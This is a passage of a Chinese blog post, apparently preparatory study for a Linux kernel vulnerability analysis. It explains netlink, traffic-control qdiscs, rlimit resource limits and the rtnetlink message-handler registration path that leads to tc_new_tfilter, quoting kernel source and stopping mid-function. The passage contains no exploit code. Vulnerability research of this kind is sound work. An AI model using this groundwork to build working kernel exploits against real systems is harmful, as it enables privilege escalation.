out!\n&quot;</span>);</span><br><span class="line">    sock_release(nl_sk-&gt;sk_socket);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(myinit_module);</span><br><span class="line">module_exit(mycleanup_module);</span><br></pre></td></tr></table></figure>

<h3 id="linux流量控制"><a href="#linux流量控制" class="headerlink" title="linux流量控制"></a>linux流量控制</h3><h4 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h4><p>在概念上有了一个大致了解，但不多，在Linux中要实现对数据包接收和发送的这些控制行为，需要使用队列结构来临时保存数据包。在Linux实现中，把这种包括数据结构和算法实现的控制机制抽象为结构<code>队列规程:Queuing discipline</code>，简称为<code>qdisc</code>。<code>qdisc</code>对外暴露两个回调接口<code>enqueue</code>和<code>dequeue</code>分别用于数据包入队和数据包出队，而具体的排队算法实现则在<code>qdisc</code>内部隐藏。不同的<code>qdisc</code>实现在Linux内核中实现为不同的内核模块。</p>
<p><code>qdisc</code>的实现可以非常简单，比如只包含单个队列，数据包先进先出，如: <code>pfifo</code>, 代码位于<code>net/sched/sch_fifo.c</code>。也可以实现相当复杂的调度逻辑。比如，可以根据数据包的属性进行过滤分类，而针对不同的<code>分类:class</code>采用不同的算法来进行处理。<code>class</code>可以理解为<code>qdisc</code>的载体，它还可以包含子类与<code>qdisc</code>。用来实现过滤逻辑的组件叫做<code>filter</code>，也叫做<code>分类器classfier</code>, 它需要挂载在<code>qdisc</code>或者<code>class</code>上。</p>
<p>基于<code>qdisc</code>, <code>class</code>和<code>filter</code>种三元素可以构建出非常复杂的树形<code>qdisc</code>结构，极大扩展流量控制的能力。</p>
<p>对于树形结构的<code>qdisc</code>, 当数据包流程最顶层<code>qdisc</code>时，会层层向下递归进行调用。如，父对象(<code>qdisc/class</code>)的<code>enqueue</code>回调接口被调用时，其上所挂载的所有<code>filter</code>依次被调用，直到一个<code>filter</code>匹配成功。然后将数据包入队到<code>filter</code>所指向的<code>class</code>，具体实现则是调用<code>class</code>所配置的<code>Qdisc</code>的<code>enqueue</code>函数。没有成功匹配<code>filter</code>的数据包分类到默认的<code>class</code>中。</p>
<p><img src="http://just4coding.com/images/2022-08-05/1.png" alt="img"></p>
<h4 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h4><p>详情查看<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoyu_750516366/article/details/121177872">https://blog.csdn.net/xiaoyu_750516366/article/details/121177872</a></p>
<h4 id="系统资源控制"><a href="#系统资源控制" class="headerlink" title="系统资源控制"></a>系统资源控制</h4><p>每一个进程都有自己的一组资源限制，在(*)inux系统中我们可以通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getrlimit</span><span class="params">(<span class="keyword">int</span> resource, struct rlimit *rlim)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setrlimit</span><span class="params">(<span class="keyword">int</span> resource, <span class="keyword">const</span> struct rlimit *rlim)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>resource</strong>：可能的选择有</p>
<p><strong>RLIMIT_AS</strong> //进程的最大虚内存空间，字节为单位。<br><strong>RLIMIT_CORE</strong> //内核转存文件的最大长度。<br><strong>RLIMIT_CPU</strong> //最大允许的CPU使用时间，秒为单位。当进程达到软限制，内核将给其发送SIGXCPU信号，这一信号的默认行为是终止进程的执行。然而，可以捕捉信号，处理句柄可将控制返回给主程序。如果进程继续耗费CPU时间，核心会以每秒一次的频率给其发送SIGXCPU信号，直到达到硬限制，那时将给进程发送 SIGKILL信号终止其执行。<br><strong>RLIMIT_DATA</strong> //进程数据段的最大值。<br><strong>RLIMIT_FSIZE</strong> //进程可建立的文件的最大长度。如果进程试图超出这一限制时，核心会给其发送SIGXFSZ信号，默认情况下将终止进程的执行。<br><strong>RLIMIT_LOCKS</strong> //进程可建立的锁和租赁的最大值。<br><strong>RLIMIT_MEMLOCK</strong> //进程可锁定在内存中的最大数据量，字节为单位。<br><strong>RLIMIT_MSGQUEUE</strong> //进程可为POSIX消息队列分配的最大字节数。<br><strong>RLIMIT_NICE</strong> //进程可通过setpriority() 或 nice()调用设置的最大完美值。<br><strong>RLIMIT_NOFILE</strong> //指定比进程可打开的最大文件描述词大一的值，超出此值，将会产生EMFILE错误。<br><strong>RLIMIT_NPROC</strong> //用户可拥有的最大进程数。<br><strong>RLIMIT_RTPRIO</strong> //进程可通过sched_setscheduler 和 sched_setparam设置的最大实时优先级。<br><strong>RLIMIT_SIGPENDING</strong> //用户可拥有的最大挂起信号数。<br><strong>RLIMIT_STACK</strong> //最大的进程堆栈，以字节为单位。</p>
<p>这2个API来取得和设置资源<br>getrlimit用来取得setrlimit用来设置 这二个参数都需要一个要控制的资源 比如控制CPU、内存、文件描述符个数等等的控制，作为第一个参数传入，第二个参数是一个rlimit的结构体地址（指针），他的结构如下定义：<br>定义放在头文件/usr/include/bits/resource.h中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">     <span class="comment">/* The current (soft) limit.    */</span></span><br><span class="line">     <span class="keyword">rlim_t</span> rlim_cur;</span><br><span class="line">     <span class="comment">/* The hard limit.    */</span></span><br><span class="line">     <span class="keyword">rlim_t</span> rlim_max;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>结构体中 rlim_cur是要取得或设置的资源软限制的值，rlim_max是硬限制<br>这两个值的设置有一个小的约束：<br>1） 任何进程可以将软限制改为小于或等于硬限制<br>2） 任何进程都可以将硬限制降低，但普通用户降低了就无法提高，该值必须等于或大于软限制<br>3） 只有超级用户可以提高硬限制<br>一个无限的限制由常量RLIM_INFINITY指定（The value RLIM_INFINITY denotes no limit on a resource ）</p>
<h2 id="漏洞模块rtnetlink分析"><a href="#漏洞模块rtnetlink分析" class="headerlink" title="漏洞模块rtnetlink分析"></a>漏洞模块rtnetlink分析</h2><p>netlink机制有很多协议，每个协议处理不同的事情，rtnetlink就是netlink的其中一个协议，下面就是netlink协议的一些宏定义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ROUTE        0    <span class="comment">/* Routing/device hook                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_UNUSED        1    <span class="comment">/* Unused number                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_USERSOCK    2    <span class="comment">/* Reserved for user mode socket protocols     */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_FIREWALL    3    <span class="comment">/* Firewalling hook                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_INET_DIAG    4    <span class="comment">/* INET socket monitoring            */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_NFLOG        5    <span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_XFRM        6    <span class="comment">/* ipsec */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_SELINUX        7    <span class="comment">/* SELinux event notifications */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ISCSI        8    <span class="comment">/* Open-iSCSI */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_AUDIT        9    <span class="comment">/* auditing */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_FIB_LOOKUP    10    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_CONNECTOR    11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_NETFILTER    12    <span class="comment">/* netfilter subsystem */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_IP6_FW        13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_DNRTMSG        14    <span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_KOBJECT_UEVENT    15    <span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_GENERIC        16</span></span><br><span class="line"><span class="comment">/* leave room for NETLINK_DM (DM Events) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_SCSITRANSPORT    18    <span class="comment">/* SCSI Transports */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ECRYPTFS    19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_TEST    20 <span class="comment">/* 用户添加的自定义协议 */</span></span></span><br></pre></td></tr></table></figure>

<p>每种协议处理不同的事情，那rtnetlink是干什么的呢，在我的初步了解中，rtnetlink主要可以更改和获取内核的一些网络配置，比如说网络路由、IP地址、链接参数、邻居设置、排队规则、流量类别和数据包分类器都可以通NETLINK_ROUTE套接字进行控制。</p>
<p>rtnetlink主要由以下消息类型组成</p>
<ul>
<li>RTM_NEWLINK、RTM_DELLINK、RTM_GETLINK创建、删除或获取有关特定网络接口的信息。</li>
<li>RTM_NEWADDR、RTM_DELADDR、RTM_GETADDR添加、删除或接收有关与接口关联的IP地址的信息。</li>
<li>RTM_NEWROUTE、RTM_DELROUTE、RTM_GETROUTE创建、删除或接收有关网络路由的信息。</li>
<li>RTM_NEWNEIGH、RTM_DELNEIGH、RTM_GETNEIGH添加、删除或接收有关邻居表条目的信息（例如，ARP条目）。</li>
<li>RTM_NEWRULE、RTM_DELRULE、RTM_GETRULE添加、删除或检索路由规则。</li>
<li>RTM_NEWQDISC、RTM_DELQDISC、RTM_GETQDISC添加、删除或获取排队规则。</li>
<li>RTM_NEWTCLASS、RTM_DELTCLASS、RTM_GETTCLASS添加、删除或获取流量类别。</li>
<li>RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTER添加、删除或接收有关流量过滤器的信息。</li>
</ul>
<h4 id="rtnetlink相关代码分析"><a href="#rtnetlink相关代码分析" class="headerlink" title="rtnetlink相关代码分析"></a>rtnetlink相关代码分析</h4><p>使用<code>NETLINK_ROUTE</code>就可以和rtnetlink进行通信了，rtnetlink有不同的消息类型，不同的消息类型也有不同的type,所以rtnetlink进行初始化的时候就会针对不同情况注册不同的操作函数。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __init <span class="title">rtnetlink_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (register_pernet_subsys(&amp;rtnetlink_net_ops))</span><br><span class="line">		panic(<span class="string">&quot;rtnetlink_init: cannot initialize rtnetlink\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	register_netdevice_notifier(&amp;rtnetlink_dev_notifier);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETLINK, rtnl_getlink,</span><br><span class="line">		      rtnl_dump_ifinfo, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETLINK, rtnl_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINK, rtnl_newlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINK, rtnl_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETADDR, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETROUTE, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETNETCONF, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINKPROP, rtnl_newlinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINKPROP, rtnl_dellinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_NEWNEIGH, rtnl_fdb_add, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELNEIGH, rtnl_fdb_del, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETNEIGH, rtnl_fdb_get, rtnl_fdb_dump, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETLINK, <span class="literal">NULL</span>, rtnl_bridge_getlink, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELLINK, rtnl_bridge_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_SETLINK, rtnl_bridge_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETSTATS, rtnl_stats_get, rtnl_stats_dump,</span><br><span class="line">		      <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETSTATS, rtnl_stats_set, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要就是调用了<code>rtnl_register()</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtnl_register</span><span class="params">(<span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">		   rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = rtnl_register_internal(<span class="literal">NULL</span>, protocol, msgtype, doit, dumpit,</span><br><span class="line">				     flags);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		pr_err(<span class="string">&quot;Unable to register rtnetlink message handler, &quot;</span></span><br><span class="line">		       <span class="string">&quot;protocol = %d, message type = %d\n&quot;</span>, protocol, msgtype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>rtnl_register()</code>函数声明可见不同消息类型的不同type有两种操作，一种是<code>doit</code>,一种是<code>dumpit</code>。有的类型这两种操作都有，有的类型只有一种。</p>
<p>在<code>rtnl_register()</code>函数中又调用了<code>rtnl_register_internal</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnl_register_internal</span><span class="params">(struct <span class="keyword">module</span> *owner,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">				  rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>, *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> __<span class="title">rcu</span> **<span class="title">tab</span>;</span></span><br><span class="line">	<span class="keyword">int</span> msgindex;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">	BUG_ON(protocol &lt; <span class="number">0</span> || protocol &gt; RTNL_FAMILY_MAX);</span><br><span class="line">	msgindex = rtm_msgindex(msgtype);</span><br><span class="line"></span><br><span class="line">	rtnl_lock();</span><br><span class="line">	tab = rtnl_dereference(rtnl_msg_handlers[protocol]);</span><br><span class="line">	<span class="keyword">if</span> (tab == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		tab = kcalloc(RTM_NR_MSGTYPES, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!tab)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* ensures we see the 0 stores */</span></span><br><span class="line">		rcu_assign_pointer(rtnl_msg_handlers[protocol], tab);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	old = rtnl_dereference(tab[msgindex]);</span><br><span class="line">	<span class="keyword">if</span> (old) &#123;</span><br><span class="line">		link = kmemdup(old, <span class="keyword">sizeof</span>(*old), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!link)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		link = kzalloc(<span class="keyword">sizeof</span>(*link), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!link)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WARN_ON(link-&gt;owner &amp;&amp; link-&gt;owner != owner);</span><br><span class="line">	link-&gt;owner = owner;</span><br><span class="line"></span><br><span class="line">	WARN_ON(doit &amp;&amp; link-&gt;doit &amp;&amp; link-&gt;doit != doit);</span><br><span class="line">	<span class="keyword">if</span> (doit)</span><br><span class="line">		link-&gt;doit = doit;</span><br><span class="line">	WARN_ON(dumpit &amp;&amp; link-&gt;dumpit &amp;&amp; link-&gt;dumpit != dumpit);</span><br><span class="line">	<span class="keyword">if</span> (dumpit)</span><br><span class="line">		link-&gt;dumpit = dumpit;</span><br><span class="line"></span><br><span class="line">	link-&gt;flags |= flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* publish protocol:msgtype */</span></span><br><span class="line">	rcu_assign_pointer(tab[msgindex], link);</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (old)</span><br><span class="line">		kfree_rcu(old, rcu);</span><br><span class="line">unlock:</span><br><span class="line">	rtnl_unlock();</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>涉及到的结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> &#123;</span></span><br><span class="line">	rtnl_doit_func		doit;</span><br><span class="line">	rtnl_dumpit_func	dumpit;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span>		*<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>有个全局指针数组<code>static struct rtnl_link __rcu *__rcu *rtnl_msg_handlers[RTNL_FAMILY_MAX + 1];</code>，他其实是一个二重指针，第一重指针的下标是消息类型，第二重下标是消息的type,所以每一个消息类型的每一个type都对应一个<code>struct rtnl_link</code>结构体。</p>
<p>除了<code>rtnetlink_init</code>会注册消息的操作之外，<code>tc_filter_init</code>也会注册一些消息的操作,其中<code>RTM_NEWTFILTER</code>这个类型就是添加一个流量过滤器，他只有<code>doit</code>操作，函数为<code>tc_new_tfilter()</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tc_filter_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tc_filter_wq = alloc_ordered_workqueue(<span class="string">&quot;tc_filter_workqueue&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!tc_filter_wq)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	err = register_pernet_subsys(&amp;tcf_net_ops);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> err_register_pernet_subsys;</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,</span><br><span class="line">		      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,</span><br><span class="line">		      tc_dump_chain, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_register_pernet_subsys:</span><br><span class="line">	destroy_workqueue(tc_filter_wq);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在稍微理清了每个消息类型的每个type如何在内核中组织存储，那该如何调用这些消息的操作函数呢，比如说<code>RTM_NEWTFILTE</code>的<code>doit</code>.</p>
<p>当用户进程通过<code>NETLINK_ROUTE</code>创建套接字并且发送<code>RTM_NEWTFILTER</code>消息用于创建一个流量过滤器时,内核会调用<code>rtnetlink_rcv_msg()</code>函数来处理rtnetlink消息。</p>
<p><code>struct nlmsghdr *nlh</code>这个结构体在学习netlink的时候就已经见过了,其中<code>family</code>就是消息类型也就是<code>protocol</code>,type就是<code>msgtype</code>，然后调用<code>link = rtnl_get_link(family, type);</code>获得对应的<code>link</code>.获得了<code>link</code>后就调用<code>link-&gt;doit()</code>函数，进而调用到了<code>tc_new_tfilter()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnetlink_rcv_msg</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">			     struct netlink_ext_ack 